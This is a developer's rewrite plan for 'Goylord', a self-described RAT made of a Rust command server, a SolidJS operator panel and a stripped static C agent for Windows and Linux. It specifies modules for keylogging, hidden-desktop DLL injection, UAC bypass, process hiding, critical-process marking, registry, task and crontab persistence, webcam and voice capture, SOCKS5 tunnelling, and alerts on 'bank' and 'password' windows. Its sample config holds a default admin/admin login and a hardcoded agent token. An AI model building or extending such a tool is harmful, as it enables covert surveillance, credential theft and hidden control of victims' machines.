# REWRITE.md — Goylord Full Rewrite Plan

**Version:** 2.0  
**Date:** 2026-07-20  
**Scope:** Complete rewrite of Server, Frontend, Agent, and Desktop  

---

## Features REMOVED From Rewrite

These features exist in the current codebase but are **permanently removed** from the rewrite. No porting, no stubs, no leftovers.

| Removed Feature | What Dies | Why |
|----------------|-----------|-----|
| **Multi-user system** | `users` table + 9 user/permission tables, user routes, user management UI, RBAC, MFA, OIDC, user-scoped build profiles, `built_by_user_id` columns, `canUserAccessClient()`, `requirePermission()`, per-user metrics | Single admin only — no roles, no permissions, no access rules |
| **Branding** | `branding_images` table, `appearance.loginBranding` (17 fields), branding routes, branding image upload/serve, `/api/login/branding`, brand env vars | Hardcoded identity, no customization |
| **Registration** | `registration_keys` table, `pending_registrations` table, `registration` config section, `/api/register`, `register.html` | No self-service signup — admin credentials in config |
| **File Share** | `shared_files` table, `shared-files` repo, `file-share-routes.ts`, `file-share.html` | Removed feature — not needed |
| **OIDC/SSO** | `oidc_auth_states` table, `oidc_identities` table, `oidc` config section, OIDC routes | Single admin has no use for SSO |
| **MFA** | `totp-rs` dependency, MFA fields on users, `/api/mfa/*` endpoints | Single admin, no MFA needed |
| **Windows ARM64** | Agent build target, arm64-specific TEB code | Not a target platform |
| **All macOS** | 12 darwin Go files, macOS identity/persistence/keylogger/elevation/sysinfo, `darwin_request_permissions` command | Not a target platform |
| **All FreeBSD** | `keylogger_default.go` (FreeBSD/OpenBSD stub), any `*_freebsd.*` files | Not a target platform |
| **All Android** | `identity_android.go`, android build tag files | Not a target platform |
| **All iOS** | 4 ios_target Go files, iOS identity/persistence/elevation/sysinfo | Not a target platform |
| **macOS permission commands** | `darwin_request_permissions` command type, macOS folder access denial in file handler | Platform removed |

### Allowed Target Platforms (5 only)

| Platform | Agent Target | Notes |
|----------|-------------|-------|
| Windows x86_64 | Primary — C + Win32 API | Full feature support |
| Windows x86 | Secondary — C + Win32 API | 32-bit Windows support |
| Linux x86_64 | C + X11/Wayland | Screen capture via XShm/XCB |
| Linux arm64 | Cross-compiled | Same codebase, different arch |
| Linux armv7 | Cross-compiled | Same codebase, different arch |

Everything else is dead code and must not appear in the rewrite.

---

## Target Stack

| Component | Current | Rewrite To | Reason |
|-----------|---------|------------|--------|
| Server | TypeScript / Bun | **Rust + axum + tokio + SQLite (rusqlite)** | Zero GC pauses, proper type system, forces clean architecture, fastest possible WebSocket relay |
| Frontend | Vanilla JS (73 files, 33K+ lines) | **SolidJS + TypeScript + Tailwind CSS v4** | Fastest reactive framework, compiles away reactive layer, tiny bundle, TypeScript-first |
| Agent | Go (18 packages, 64 handler files) | **C + Win32 API** (Windows) / **C + X11** (Linux) | Smallest binary, no runtime, no GC pauses, direct OS calls, zero footprint |
| Desktop | Tauri v2 (Rust shell + web UI) | **Tauri v2 + SolidJS** (keep Rust shell) | Already correct — just swap web frontend to match |

---

## Architecture Overview

```
                    ┌─────────────────┐
                    │   Goylord-Desktop│
                    │  (Tauri + Solid) │
                    └────────┬────────┘
                             │ wraps web UI
                    ┌────────▼────────┐
                    │   Goylord-Web    │
                    │ (SolidJS + TS)   │◄─── Single Admin
                    └────────┬────────┘
                             │ HTTPS / WSS
                    ┌────────▼────────┐
                    │  Goylord-Server  │
                    │  (Rust + axum)   │
                    └────────┬────────┘
                             │ WSS (msgpack)
                    ┌────────▼────────┐
                    │  Goylord-Agent   │
                    │  (C + Win32/X11) │◄─── Target machines
                    └─────────────────┘
```

---

## Phase 0 — Foundation (Week 1-2)

### 0.1 Repository Structure

```
Goylord/
├── server/              # Rust workspace crate
│   ├── Cargo.toml
│   ├── src/
│   │   ├── main.rs
│   │   ├── config.rs          # TOML config — single admin, no registration/branding
│   │   ├── auth/
│   │   │   ├── mod.rs
│   │   │   └── jwt.rs         # Single-admin JWT auth — no RBAC, no OIDC, no MFA
│   │   ├── db/
│   │   │   ├── mod.rs
│   │   │   ├── schema.rs      # 16 table DDLs (no user/branding/registration tables)
│   │   │   ├── migrations.rs
│   │   │   └── repos/         # One file per table group
│   │   │       ├── mod.rs
│   │   │       ├── clients.rs
│   │   │       ├── builds.rs
│   │   │       ├── notifications.rs
│   │   │       ├── plugins.rs
│   │   │       ├── keylog.rs
│   │   │       └── chat.rs
│   │   ├── ws/
│   │   │   ├── mod.rs
│   │   │   ├── protocol.rs      # msgpack encode/decode
│   │   │   ├── upgrade.rs       # WS upgrade routing
│   │   │   ├── lifecycle.rs     # Client/viewer connect/disconnect
│   │   │   ├── relay.rs         # Frame relay, input relay
│   │   │   ├── sessions.rs      # 12 session types
│   │   │   └── handlers/        # Per-feature WS message handlers
│   │   │       ├── mod.rs
│   │   │       ├── desktop.rs
│   │   │       ├── backstage.rs
│   │   │       ├── console.rs
│   │   │       ├── webcam.rs
│   │   │       ├── files.rs
│   │   │       ├── processes.rs
│   │   │       ├── keylogger.rs
│   │   │       ├── voice.rs
│   │   │       ├── chat.rs
│   │   │       ├── notifications.rs
│   │   │       └── proxy.rs
│   │   ├── routes/
│   │   │   ├── mod.rs
│   │   │   ├── auth.rs          # POST /api/login only
│   │   │   ├── clients.rs
│   │   │   ├── builds.rs
│   │   │   ├── enrollment.rs
│   │   │   ├── plugins.rs
│   │   │   ├── settings.rs
│   │   │   ├── backup.rs
│   │   │   ├── deploy.rs
│   │   │   ├── scripts.rs
│   │   │   ├── notifications.rs
│   │   │   ├── webrtc.rs
│   │   │   ├── pages.rs         # Serve built SolidJS static files
│   │   │   └── misc.rs          # Audit logs, metrics, push, thumbnails, screenshots
│   │   ├── state/
│   │   │   ├── mod.rs
│   │   │   ├── clients.rs       # Arc<RwLock<HashMap>> for ClientInfo
│   │   │   ├── streams.rs       # Streaming state per client
│   │   │   └── metrics.rs
│   │   ├── build/
│   │   │   ├── mod.rs
│   │   │   ├── process.rs       # Cross-compilation spawner
│   │   │   ├── signing.rs       # Ed25519 build signing
│   │   │   └── profiles.rs      # Global profiles (no user_id FK)
│   │   ├── plugins/
│   │   │   ├── mod.rs
│   │   │   ├── loader.rs        # ZIP extraction, manifest
│   │   │   ├── runtime.rs       # Worker thread host
│   │   │   ├── signatures.rs    # Ed25519 verification
│   │   │   └── hooks.rs         # Build hooks
│   │   ├── media/
│   │   │   ├── mod.rs
│   │   │   ├── recording.rs     # RD recording
│   │   │   ├── thumbnails.rs
│   │   │   └── webrtc.rs        # WHIP/WHEP, TURN
│   │   └── util/
│   │       ├── mod.rs
│   │       ├── msgpack.rs
│   │       ├── tls.rs
│   │       └── zip.rs           # Pure Rust ZIP
│   ├── migrations/              # SQL migration files
│   └── plugins/                 # Plugin storage
│
├── web/                 # SolidJS frontend
│   ├── package.json
│   ├── tsconfig.json
│   ├── vite.config.ts
│   ├── index.html
│   ├── src/
│   │   ├── App.tsx
│   │   ├── main.tsx
│   │   ├── router.tsx            # File-based routing
│   │   ├── api/
│   │   │   ├── mod.ts
│   │   │   ├── auth.ts
│   │   │   ├── clients.ts
│   │   │   ├── builds.ts
│   │   │   ├── plugins.ts
│   │   │   ├── settings.ts
│   │   │   ├── enrollment.ts
│   │   │   └── ws.ts             # WebSocket connection manager
│   │   ├── stores/
│   │   │   ├── auth.ts           # Auth state (Solid signals) — single admin
│   │   │   ├── clients.ts        # Client list, filters
│   │   │   ├── dashboard.ts
│   │   │   └── ui.ts             # Sidebar, modals, toasts
│   │   ├── components/
│   │   │   ├── layout/
│   │   │   │   ├── Sidebar.tsx
│   │   │   │   ├── Topbar.tsx
│   │   │   │   ├── CommandMenu.tsx
│   │   │   │   └── ToastContainer.tsx
│   │   │   ├── clients/
│   │   │   │   ├── ClientGrid.tsx
│   │   │   │   ├── ClientCard.tsx
│   │   │   │   ├── ClientRow.tsx
│   │   │   │   └── ClientFilters.tsx
│   │   │   ├── streaming/
│   │   │   │   ├── StreamViewer.tsx    # Shared base for RD/Backstage/Webcam
│   │   │   │   ├── StatsBar.tsx        # FPS/Latency/Network chips
│   │   │   │   └── SettingsPanel.tsx
│   │   │   ├── files/
│   │   │   │   ├── FileBrowser.tsx
│   │   │   │   ├── FileList.tsx
│   │   │   │   ├── TransferPanel.tsx
│   │   │   │   └── PreviewModal.tsx
│   │   │   ├── console/
│   │   │   │   └── Terminal.tsx         # xterm.js wrapper
│   │   │   ├── build/
│   │   │   │   ├── BuildForm.tsx
│   │   │   │   └── BuildHistory.tsx
│   │   │   ├── settings/
│   │   │   │   ├── SettingsLayout.tsx
│   │   │   │   └── SettingsSection.tsx
│   │   │   └── ui/
│   │   │       ├── Button.tsx
│   │   │       ├── Input.tsx
│   │   │       ├── Select.tsx
│   │   │       ├── Modal.tsx
│   │   │       ├── Pill.tsx
│   │   │       └── DataTable.tsx
│   │   ├── pages/
│   │   │   ├── Dashboard.tsx
│   │   │   ├── Login.tsx           # Single admin login — no register link
│   │   │   ├── Console.tsx
│   │   │   ├── RemoteDesktop.tsx
│   │   │   ├── Backstage.tsx
│   │   │   ├── Webcam.tsx
│   │   │   ├── Voice.tsx
│   │   │   ├── FileBrowser.tsx
│   │   │   ├── Processes.tsx
│   │   │   ├── Keylogger.tsx
│   │   │   ├── Screenshots.tsx
│   │   │   ├── Build.tsx
│   │   │   ├── Settings.tsx        # No branding, no registration, no user management sections
│   │   │   ├── Purgatory.tsx
│   │   │   ├── Notifications.tsx
│   │   │   ├── Scripts.tsx
│   │   │   ├── Deploy.tsx
│   │   │   ├── Logs.tsx
│   │   │   ├── Metrics.tsx
│   │   │   ├── Plugins.tsx
│   │   │   └── Socks5Manager.tsx
│   │   ├── hooks/
│   │   │   ├── useWebSocket.ts
│   │   │   ├── useStream.ts          # Shared streaming logic
│   │   │   └── useInputLatency.ts
│   │   └── styles/
│   │       ├── index.css             # Tailwind base + custom
│   │       └── theme.css             # RAT-style dark theme tokens
│   └── public/
│       └── assets/                   # Static assets
│
├── agent/               # C agent (Windows + Linux)
│   ├── Makefile                # Builds 5 targets: win64, win32, linux64, linux-arm64, linux-armv7
│   ├── Makefile.windows        # Windows-native build (MSVC or MinGW)
│   ├── build.h                 # Build-time constants (server URL, token, etc.)
│   ├── main.c                  # Entry point
│   ├── session.c               # WebSocket connection, reconnection, enrollment
│   ├── session.h
│   ├── wire.c                  # Msgpack encode/decode
│   ├── wire.h
│   ├── wire_types.h            # All protocol structs
│   ├── config.c                # Identity derivation (HWID), config loading
│   ├── config.h
│   ├── command.c               # Command dispatch (command types minus darwin/ios/android)
│   ├── command.h
│   ├── platform/               # Platform abstraction layer
│   │   ├── platform.h          # Shared interface declarations
│   │   ├── win32.c             # Windows implementation
│   │   ├── win32.h
│   │   ├── linux.c            # Linux implementation
│   │   └── linux.h
│   ├── handlers/
│   │   ├── desktop.c           # Screen streaming, DXGI/BitBlt/XShm capture
│   │   ├── desktop.h
│   │   ├── backstage.c         # Hidden desktop, DLL injection (Windows only)
│   │   ├── backstage.h
│   │   ├── input.c             # Mouse/keyboard SendInput/XTest
│   │   ├── input.h
│   │   ├── console.c           # PTY management (cmd/powershell/bash)
│   │   ├── console.h
│   │   ├── files.c             # Full file operations
│   │   ├── files.h
│   │   ├── webcam.c            # DirectShow webcam capture (Windows only)
│   │   ├── webcam.h
│   │   ├── voice.c             # winmm.dll waveIn/waveOut (Windows only)
│   │   ├── voice.h
│   │   ├── audio.c             # Desktop audio capture (WASAPI/PulseAudio)
│   │   ├── audio.h
│   │   ├── processes.c         # Process enumeration
│   │   ├── processes.h
│   │   ├── keylogger.c         # SetWindowsHookEx/XInput keyboard hook
│   │   ├── keylogger.h
│   │   ├── screenshot.c        # Multi-monitor screenshot
│   │   ├── screenshot.h
│   │   ├── clipboard.c         # Clipboard sync
│   │   ├── clipboard.h
│   │   ├── socks5.c            # SOCKS5 proxy tunnel
│   │   ├── socks5.h
│   │   ├── elevation.c         # UAC bypass / sudo (Windows only, Linux no-op)
│   │   ├── elevation.h
│   │   ├── plugins.c           # DLL loading, plugin events
│   │   ├── plugins.h
│   │   ├── webrtc.c            # WebRTC publish
│   │   ├── webrtc.h
│   │   ├── privacy.c           # Overlay windows + input blocking (Windows only)
│   │   ├── privacy.h
│   │   ├── notification.c      # Active window monitoring
│   │   ├── notification.h
│   │   ├── scripts.c           # Script execution
│   │   ├── scripts.h
│   │   ├── sysinfo.c           # Hardware enumeration
│   │   └── sysinfo.h
│   ├── capture/                # Screen capture pipeline
│   │   ├── dxgi.c              # DXGI desktop duplication (Windows only)
│   │   ├── dxgi.h
│   │   ├── bitblt.c            # GDI BitBlt fallback (Windows only)
│   │   ├── bitblt.h
│   │   ├── xshm.c             # XShm/XCB capture (Linux only)
│   │   ├── xshm.h
│   │   ├── h264.c              # H.264/HEVC encoding (Media Foundation)
│   │   ├── h264.h
│   │   ├── nvenc.c             # NVENC encoder (Windows only)
│   │   ├── nvenc.h
│   │   ├── inject.c            # DLL injection for backstage (Windows only)
│   │   ├── inject.h
│   │   ├── uia.c               # UI Automation input (Windows only)
│   │   └── uia.h
│   ├── persistence/
│   │   ├── registry.c         # Registry persistence (Windows only)
│   │   ├── startup.c           # Startup folder (Windows) / .desktop file (Linux)
│   │   ├── tasksched.c         # Task Scheduler (Windows only)
│   │   ├── crontab.c           # Crontab persistence (Linux only)
│   │   └── persistence.h
│   ├── stealth/
│   │   ├── critical.c          # RtlSetProcessIsCritical (Windows only)
│   │   ├── hide.c              # Process hiding
│   │   ├── crashlog.c          # Hidden crash log writing
│   │   ├── hardcrash.c         # Unhandled exception filter
│   │   ├── console_suppress.c  # AllocConsole suppression (Windows only)
│   │   └── stealth.h
│   ├── encoding/
│   │   ├── jpeg.c              # JPEG encode/decode (stb_image)
│   │   ├── opus.c              # Opus audio codec
│   │   └── encoding.h
│   ├── third_party/
│   │   ├── msgpack-c/          # Msgpack C library
│   │   ├── libwebsockets/      # WebSocket client
│   │   ├── stb/                # stb_image, stb_image_write
│   │   ├── opus/               # Opus codec
│   │   └── wasm3/              # WASM plugin runtime (~80KB)
│   └── common/
│       ├── list.h              # Intrusive linked list
│       ├── map.h               # Hash map
│       ├── buffer.h            # Dynamic buffer
│       ├── thread.h            # Thread helpers
│       └── log.h               # Silent logging
│
├── desktop/             # Tauri desktop app
│   ├── package.json
│   ├── src-tauri/
│   │   ├── Cargo.toml
│   │   ├── tauri.conf.json
│   │   ├── src/
│   │   │   ├── main.rs
│   │   │   └── lib.rs          # Connection form, popup handler
│   │   └── icons/
│   └── src/
│       └── (same SolidJS web UI, loaded from ../web/dist/ or embedded)
│
├── protocol/            # SHARED protocol definitions
│   ├── definitions.toml       # Single source of truth for all message/command types
│   ├── gen-rust.rs            # → server/src/ws/protocol.rs
│   ├── gen-ts.ts              # → web/src/api/types.ts
│   ├── gen-c.c                # → agent/wire_types.h
│   ├── types.rs               # Rust server protocol types
│   ├── types.ts               # TypeScript frontend types (auto-generated from TOML)
│   └── types.h                # C agent protocol types
│
├── docs/
├── REWRITE.md
├── AGENTS.md
└── CHANGELOG.md
```

### 0.2 Shared Protocol

The wire protocol MUST be defined once and shared across all components.

**Solution:** Define protocol in a single `protocol/definitions.toml` file. Code-gen the Rust, TypeScript, and C structs from it.

```toml
# protocol/definitions.toml example

[message.Hello]
type = "hello"
[message.Hello.fields]
id = { type = "String", tag = 1 }
hwid = { type = "String", tag = 2 }
host = { type = "String", tag = 3 }
os = { type = "String", tag = 4 }
arch = { type = "String", tag = 5 }
version = { type = "String", tag = 6 }
# ... all fields

[command.DesktopStart]
type = "desktop_start"
[command.DesktopStart.fields]
webrtc = { type = "bool", tag = 1 }
display = { type = "u32", tag = 2 }
```

**Removed command types** (dead in rewrite):
- `darwin_request_permissions` — macOS removed
- `darwin_folder_access_*` — macOS removed
- Any iOS/Android-specific command types

Code generators:
- `protocol/gen-rust.rs` → outputs `server/src/ws/protocol.rs`
- `protocol/gen-ts.ts` → outputs `web/src/api/types.ts`
- `protocol/gen-c.c` → outputs `agent/wire_types.h`

### 0.3 Build System

| Component | Build Tool | Command |
|-----------|-----------|---------|
| Server | Cargo | `cargo build --release` |
| Web | Vite + SolidJS | `bun run build` → static HTML/JS/CSS served by Rust |
| Agent (Windows x64) | MinGW | `make TARGET=win64` |
| Agent (Windows x86) | MinGW | `make TARGET=win32` |
| Agent (Linux x64) | GCC | `make TARGET=linux64` |
| Agent (Linux arm64) | aarch64 cross-compiler | `make TARGET=linux-arm64` |
| Agent (Linux armv7) | armv7 cross-compiler | `make TARGET=linux-armv7` |
| Desktop | Tauri CLI | `cargo tauri build` |

Agent Makefile:
```makefile
# agent/Makefile
TARGETS = win64 win32 linux64 linux-arm64 linux-armv7

# Windows targets
ifeq ($(TARGET),win64)
  CC = x86_64-w64-mingw32-gcc
  CFLAGS += -DWIN32_LEAN_AND_MEAN -DWIN64
  LDFLAGS = -lws2_32 -lwinmm -luser32 -lgdi32 -ld3d11 -ldxgi -lole32 -loleaut32 -ladvapi32 -lpsapi -lshell32 -lntdll -lkernel32
  OUTPUT = agent_x64.exe
endif
ifeq ($(TARGET),win32)
  CC = i686-w64-mingw32-gcc
  CFLAGS += -DWIN32_LEAN_AND_MEAN -DWIN32
  LDFLAGS = -lws2_32 -lwinmm -luser32 -lgdi32 -ld3d11 -ldxgi -lole32 -loleaut32 -ladvapi32 -lpsapi -lshell32 -lntdll -lkernel32
  OUTPUT = agent_x86.exe
endif

# Linux targets
ifeq ($(TARGET),linux64)
  CC = gcc
  CFLAGS += -DLINUX -DLINUX64
  LDFLAGS = -lX11 -lXext -lpthread -ldl
  OUTPUT = agent_linux_x64
endif
ifeq ($(TARGET),linux-arm64)
  CC = aarch64-linux-gnu-gcc
  CFLAGS += -DLINUX -DLINUX_ARM64
  LDFLAGS = -lX11 -lXext -lpthread -ldl
  OUTPUT = agent_linux_arm64
endif
ifeq ($(TARGET),linux-armv7)
  CC = arm-linux-gnueabihf-gcc
  CFLAGS += -DLINUX -DLINUX_ARMV7
  LDFLAGS = -lX11 -lXext -lpthread -ldl
  OUTPUT = agent_linux_armv7
endif

CFLAGS += -O2 -s -static -flto -DNDEBUG

release: $(OUTPUT)

$(OUTPUT): $(OBJS)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	strip --strip-all $@
```

Expected agent binary size: **150KB - 500KB** (vs Go's 5-8MB).

---

## Phase 1 — Server Core (Week 3-6)

### 1.1 Rust Dependencies

```toml
# server/Cargo.toml
[dependencies]
axum = "0.7"
tokio = { version = "1", features = ["full"] }
tower = "0.5"
tower-http = { version = "0.6", features = ["cors", "fs", "trace"] }
rusqlite = { version = "0.32", features = ["bundled"] }
rmp-serde = "1"           # msgpack
serde = { version = "1", features = ["derive"] }
serde_json = "1"
uuid = { version = "1", features = ["v4"] }
jsonwebtoken = "9"
argon2 = "0.5"            # password hashing (single admin)
rand = "0.8"
ed25519-dalek = "2"       # build signing
toml = "0.8"              # config parsing
url = "2"
axum-server = { version = "0.7", features = ["tls-rustls"] }
tracing = "0.1"
tracing-subscriber = "0.3"
flate2 = "1"              # ZIP
crc32fast = "1"           # CRC32 for ZIP
base64 = "0.22"
```

**Removed dependencies** (no longer needed):
- `totp-rs` — MFA removed
- No OIDC crate — OIDC removed

### 1.2 Database Schema (16 tables)

The rewrite uses a **clean schema** — not byte-identical to the old one. The old DB is migrated on first start.

**Tables KEPT:**

| # | Table | Changes from current |
|---|-------|---------------------|
| 1 | `clients` | Removed `built_by_user_id` column and its index |
| 2 | `client_groups` | Unchanged |
| 3 | `client_search_fts` | Unchanged |
| 4 | `banned_ips` | Unchanged |
| 5 | `keylog_archive_files` | Unchanged |
| 6 | `keylog_archive_fts` | Unchanged |
| 7 | `revoked_tokens` | Unchanged |
| 8 | `builds` | Removed `built_by_user_id` column |
| 9 | `build_claims` | Unchanged |
| 10 | `build_profiles` | Removed `user_id` FK, PK changed to `name` alone |
| 11 | `saved_scripts` | Removed `user_id` FK and its index |
| 12 | `notification_screenshots` | Unchanged |
| 13 | `notifications` | Unchanged |
| 14 | `auto_scripts` | Removed `created_by_user_id` column |
| 15 | `auto_script_runs` | Unchanged |
| 16 | `auto_deploys` | Removed `created_by_user_id` column and its index |
| 17 | `auto_deploy_runs` | Unchanged |
| 18 | `chat_messages` | Removed `user_id`, `user_role` columns; `username` hardcoded from config |
| 19 | `push_subscriptions` | Removed `user_id` FK; single admin owns all subscriptions |
| 20 | `shared_ui_settings` | Removed `updated_by_user_id` column |

**Tables REMOVED (and why):**

| Table | Why |
|-------|-----|
| `users` | Single admin — credentials in config.toml, no DB row |
| `user_client_access_rules` | No multi-user access control |
| `user_feature_permissions` | No feature gating |
| `user_plugin_access_rules` | No plugin access control |
| `permission_groups` | No permission groups |
| `permission_group_permissions` | No permission groups |
| `user_permission_groups` | No permission groups |
| `user_extra_permissions` | No extra permissions |
| `schema_migrations` | No migration framework needed — clean start |
| `sessions` | Single admin — simplified session model, no per-user tracking |
| `oidc_auth_states` | OIDC removed |
| `oidc_identities` | OIDC removed |
| `branding_images` | Branding removed |
| `shared_files` | File Share removed |
| `registration_keys` | Registration removed |
| `pending_registrations` | Registration removed |

**Net: 20 tables (down from 36).** 16 removed.

### 1.3 Route Porting Order

Port routes in dependency order — auth first, then CRUD, then WebSocket:

| Batch | Routes | Depends On |
|-------|--------|------------|
| 1 | `auth` (single POST /api/login) | config, jwt |
| 2 | `pages` (static file serving) | auth |
| 3 | `clients`, `enrollment`, `client-groups`, `client-commands` | auth, clients state |
| 4 | `builds`, `build-profiles` (global, no user_id) | auth, clients, config |
| 5 | `deploy` (no file-share) | auth, clients |
| 6 | `plugins` | auth, db |
| 7 | `settings` (config update — no branding/registration/OIDC sections) | auth, config |
| 8 | `backup` | all above |
| 9 | `webrtc`, `rd-recording` | clients, ws |
| 10 | `misc` (audit logs, metrics, push, notifications, thumbnails, screenshots — no branding) | various |
| 11 | `ws-upgrade` + `websocket-lifecycle` | everything above |

**Removed route batches:**
- ~~Batch 4: `users-routes`, `permission-groups-routes`, `registration-routes`~~ — removed
- ~~`file-share-routes`~~ — removed
- ~~`oidc-routes`~~ — removed

### 1.4 WebSocket Architecture

The current server has 12 viewer roles and ~100 in-memory Maps. With single admin, the viewer role system simplifies — no `canUserAccessClient()` checks, no `requirePermission()` gates.

```rust
// server/src/state/clients.rs
pub struct ClientRegistry {
    clients: Arc<RwLock<HashMap<String, ClientInfo>>>,
}

// server/src/ws/sessions.rs
pub struct SessionManager {
    console: Arc<RwLock<HashMap<String, Vec<ConsoleSession>>>>,
    rd: Arc<RwLock<HashMap<String, Vec<RdSession>>>>,
    backstage: Arc<RwLock<HashMap<String, Vec<BackstageSession>>>>,
    webcam: Arc<RwLock<HashMap<String, Vec<WebcamSession>>>>,
    file_browser: Arc<RwLock<HashMap<String, Vec<FileBrowserSession>>>>,
    process: Arc<RwLock<HashMap<String, Vec<ProcessSession>>>>,
    keylogger: Arc<RwLock<HashMap<String, Vec<KeyloggerSession>>>>,
    voice: Arc<RwLock<HashMap<String, Vec<VoiceSession>>>>,
    desktop_audio: Arc<RwLock<HashMap<String, Vec<DesktopAudioSession>>>>,
    notification: Arc<RwLock<HashMap<String, Vec<NotificationSession>>>>,
    dashboard: Arc<RwLock<HashMap<String, Vec<DashboardSession>>>>,
    chat: Arc<RwLock<HashMap<String, Vec<ChatSession>>>>,
}
```

### 1.5 In-Memory State Cleanup

| Current Global Map | Rust Struct | Location |
|-------------------|-------------|----------|
| `clientManager.clients` | `ClientRegistry` | `state/clients.rs` |
| `rdStreamingState` | `StreamStates<Desktop>` | `state/streams.rs` |
| `backstageStreamingState` | `StreamStates<Backstage>` | `state/streams.rs` |
| `webcamStreamingState` | `StreamStates<Webcam>` | `state/streams.rs` |
| `rdInputPending` | `InputLatencyTracker` | `ws/relay.rs` |
| `backstageInputPending` | `InputLatencyTracker` | `ws/relay.rs` |
| `lastKeyframeRequestAt` | `KeyframeCooldown` | `ws/relay.rs` |
| All session maps | `SessionManager` | `ws/sessions.rs` |
| Plugin runtime workers | `PluginRuntimeManager` | `plugins/runtime.rs` |
| Build processes | `BuildProcessManager` | `build/process.rs` |
| SOCKS5 proxy tunnels | `ProxyManager` | `ws/handlers/proxy.rs` |
| Notification delivery | `NotificationDispatcher` | `ws/handlers/notifications.rs` |
| Thumbnail cache | `ThumbnailCache` | `media/thumbnails.rs` |

### 1.6 Auth Flow (Simplified — Single Admin)

1. `POST /api/login` → argon2 verify against config.toml `auth.password` → JWT (jsonwebtoken) + cookie (`goylord_token`)
2. Middleware: `axum::middleware::from_fn(auth_guard)` — extracts JWT from cookie or Bearer header
3. Agent auth: `x-agent-token` header check against config.toml `auth.agent_token`
4. Token revocation: `revoked_tokens` table, periodic cleanup via tokio::spawn

**That's it.** No MFA, no OIDC, no RBAC, no permission checks, no user scopes.

Every authenticated request = the admin. No `requirePermission()` calls. No `canUserAccessClient()`. No feature gating.

### 1.7 Config System (Simplified)

```toml
# server/config.toml

[auth]
username = "admin"
password = "admin"
jwt_secret = ""           # auto-generated on first run if empty
agent_token = "faANpOH*WUXVgiDngPA0zXFQTS&jubqAOZsvAYkjziKoZ830P%hC@MWi#oipIyVC"

[server]
port = 5173
host = "0.0.0.0"

[tls]
cert_path = ""
key_path = ""
ca_path = ""
[tls.certbot]
enabled = false

[enrollment]
require_approval = true
auto_approve_unless_suspicious = false

[notifications]
keywords = ["bank", "password", "admin"]
min_interval_ms = 8000
spam_window_ms = 60000
spam_warn_threshold = 5
history_limit = 200
webhook_enabled = false
webhook_url = ""
telegram_enabled = false
telegram_bot_token = ""
telegram_chat_id = ""
clipboard_enabled = false
anti_spam_max_hits = 15
anti_spam_window_ms = 600000
anti_spam_cooldown_ms = 600000

[security]
session_ttl_hours = 168
login_max_attempts = 5
login_window_minutes = 15
login_lockout_minutes = 30
password_min_length = 6

[plugins]
trusted_keys = []

[chat]
retention_days = 30

[build_rate_limit]
max_builds_per_hour = 5
global_max_concurrent = 3

[build_signing]
banlist = []

[thumbnails]
dashboard_enabled = true
wall_enabled = true

[input_archive]
enabled = false
retention_days = 7
max_file_bytes = 5242880
poll_interval_seconds = 300
```

**Config sections REMOVED:**
- `[oidc]` — 18 fields — OIDC removed
- `[registration]` — 4 fields — registration removed
- `[appearance]` — 18 fields (customCSS + 17 loginBranding fields) — branding removed
- `security.mfa_required_for_admins` — MFA removed
- `security.mfa_required_for_non_admins` — MFA removed
- `security.password_require_*` — simplified (single admin sets own password)
- `build_rate_limit.max_concurrent_per_user` — no users, only global limit

**Net: ~45 config fields (down from ~80).**

Runtime config updates via `PATCH /api/settings/*` — same pattern, fewer sections.

---

## Phase 2 — Frontend (Week 7-10)

### 2.1 SolidJS Project Setup

```json
{
  "name": "goylord-web",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "typecheck": "tsc --noEmit"
  },
  "dependencies": {
    "solid-js": "^1.9",
    "@solidjs/router": "^0.14",
    "xterm": "^5.3",
    "xterm-addon-fit": "^0.8",
    "@msgpack/msgpack": "^3"
  },
  "devDependencies": {
    "vite": "^6",
    "vite-plugin-solid": "^2",
    "typescript": "^5.7",
    "tailwindcss": "^4"
  }
}
```

### 2.2 Design System (RAT Style)

```css
/* web/src/styles/theme.css */
:root {
  --bg-body: #0a0a0f;
  --bg-surface: #111116;
  --bg-surface-dark: #0e0e14;
  --bg-elevated: #141418;
  --bg-hover: rgba(255, 255, 255, 0.04);

  --text-primary: #d4d4d8;
  --text-muted: #888890;
  --text-dim: #5a5a64;
  --text-bright: #f0f0f2;

  --border: rgba(255, 255, 255, 0.10);
  --border-strong: rgba(255, 255, 255, 0.20);

  --accent: #5a6a9a;
  --accent-hover: #6a7aaa;
  --success: #4a8a5a;
  --danger: #a04040;
  --warning: #9a8030;

  --radius: 2px;
  --radius-sm: 1px;
  --radius-lg: 3px;

  --shadow: 0 1px 3px rgba(0, 0, 0, 0.4);

  --font-body: "Inter", "Segoe UI", system-ui, sans-serif;
  --font-mono: "JetBrains Mono", "SFMono-Regular", Menlo, Consolas, monospace;
}
```

### 2.3 Component Library

| Component | Props | Used By |
|-----------|-------|---------|
| `<Button>` | variant (primary/ghost/danger), size, disabled | Every page |
| `<Input>` | type, placeholder, value, onInput | Forms, settings |
| `<Select>` | options, value, onChange | Filters, settings |
| `<Modal>` | open, onClose, title | All modals |
| `<Pill>` | variant (online/offline/admin/system/ti) | Client cards, status |
| `<DataTable>` | columns, rows, sort, pagination | Builds, scripts, etc. |
| `<StatsChip>` | label, value, color | FPS/latency/network bars |
| `<Toast>` | message, type, duration | Global notification |
| `<Sidebar>` | links, collapsed | Layout |
| `<Topbar>` | title, actions | Layout |

### 2.4 Page Porting Order

| Batch | Pages | Lines (current JS) |
|-------|-------|-------------------|
| 1 | Login (no register link, no branding fetch) | ~300 |
| 2 | Dashboard (client grid + filters) | ~4,200 |
| 3 | Settings (no branding/registration/users sections) | ~1,800 |
| 4 | Purgatory, Plugins | ~1,600 |
| 5 | Build (no user-scoped profiles) | ~3,000 |
| 6 | Console | ~800 |
| 7 | Remote Desktop, Backstage | ~4,430 |
| 8 | Webcam, Voice | ~1,400 |
| 9 | File Browser | ~3,900 |
| 10 | Processes, Keylogger, Screenshots | ~2,365 |
| 11 | Scripts, Deploy | ~1,200 |
| 12 | Notifications, Metrics, Logs | ~3,000 |
| 13 | Socks5 Manager, Sol Publish, WinRE, Graph | ~1,300 |

**Removed pages:**
- ~~Users~~ — no user management
- ~~File Share~~ — feature removed
- ~~Register~~ — no registration
- ~~Change Password~~ — admin password in config.toml

### 2.5 WebSocket Manager

```typescript
// web/src/api/ws.ts
export function createClientWS(clientId: string) {
  // Returns typed event emitter for a specific client WS
  // Handles: connect, reconnect, msgpack encode/decode
  // Exposes: send(type, payload), on(type, handler), close()
}

// web/src/hooks/useStream.ts
export function useStream(clientId: string, kind: "desktop" | "backstage" | "webcam") {
